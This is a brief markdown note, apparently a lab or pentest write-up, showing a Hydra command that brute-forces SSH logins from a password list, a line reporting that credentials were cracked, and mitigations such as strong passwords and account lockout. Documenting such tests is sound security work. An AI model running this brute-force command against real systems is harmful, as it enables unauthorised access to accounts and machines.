# SSH Brute Force using Hydra

## Command

hydra -l user -P passwords.txt ssh://<target-ip>


### Result
Successfully brute-forced login credentials.

### Risk
Unauthorized system access

### Mitigation
- Use strong passwords
- Enable account lockout policies
